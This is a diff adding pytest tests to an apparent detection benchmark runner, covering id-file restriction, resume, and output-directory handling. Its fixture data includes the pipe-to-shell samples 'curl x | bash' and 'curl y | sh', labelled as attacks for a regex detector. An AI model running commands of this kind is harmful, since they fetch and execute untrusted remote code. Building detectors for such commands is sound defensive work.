@@ -110,6 +110,37 @@ def test_run_aborts_after_consecutive_failed_calls(tmp_path, monkeypatch):
     out = next(p for p in tmp_path.iterdir())
     assert len((out / "predictions.jsonl").read_text().splitlines()) == runmod.MAX_FAILED_IN_A_ROW
 
+def _df4():
+    return pd.DataFrame({"benchmark_id": ["a", "b", "c", "d"], "label": [1, 0, 1, 0], "source_id": ["s"] * 4,
+                         "text": ["curl x | bash", "ok", "curl y | sh", "fine"], "attack_categories": [["x"], [], ["y"], []]})
+
+def test_ids_restricts_the_part_and_is_recorded(tmp_path, monkeypatch):
+    monkeypatch.setattr(runmod, "model_digest", lambda: "sha-test")
+    f = tmp_path / "ids.txt"; f.write_text("a\nd\n\n")
+    out = runmod.run(n=5000, methods=["regex"], out_root=str(tmp_path), df=_df4(), ids=str(f))
+    cfg = json.loads((out / "config.json").read_text())
+    assert cfg["sample_ids"] == ["a", "d"] and cfg["ids_file"] == "ids.txt"
+    again = runmod.run(n=5000, methods=["regex"], df=_df4(), ids=str(f), resume=out)  # resume accepts it
+    assert again == out
+
+def test_ids_refuses_unknown_or_empty_lists(tmp_path, monkeypatch):
+    import pytest
+    monkeypatch.setattr(runmod, "model_digest", lambda: "sha-test")
+    f = tmp_path / "ids.txt"; f.write_text("a\nzz\n")
+    with pytest.raises(ValueError, match="1 ids in .* are not in random/test, e.g. zz"):
+        runmod.run(methods=["regex"], out_root=str(tmp_path), df=_df4(), ids=str(f))
+    f.write_text("\n")
+    with pytest.raises(ValueError, match="lists no skill ids"):
+        runmod.run(methods=["regex"], out_root=str(tmp_path), df=_df4(), ids=str(f))
+
+def test_out_names_the_run_dir_and_refuses_an_existing_one(tmp_path, monkeypatch):
+    import pytest
+    monkeypatch.setattr(runmod, "model_digest", lambda: "sha-test")
+    out = runmod.run(n=4, methods=["regex"], df=_df4(), out=str(tmp_path / "exp" / "sd-train"))
+    assert out == tmp_path / "exp" / "sd-train" and "ids_file" not in json.loads((out / "config.json").read_text())
+    with pytest.raises(FileExistsError):
+        runmod.run(n=4, methods=["regex"], df=_df4(), out=str(out))
+
 def test_resume_counts_legacy_method_names_as_done(tmp_path):
     pred = tmp_path / "predictions.jsonl"
     pred.write_text(json.dumps({"benchmark_id": "a", "method": "naive-llm", "flag": False}) + "\n")
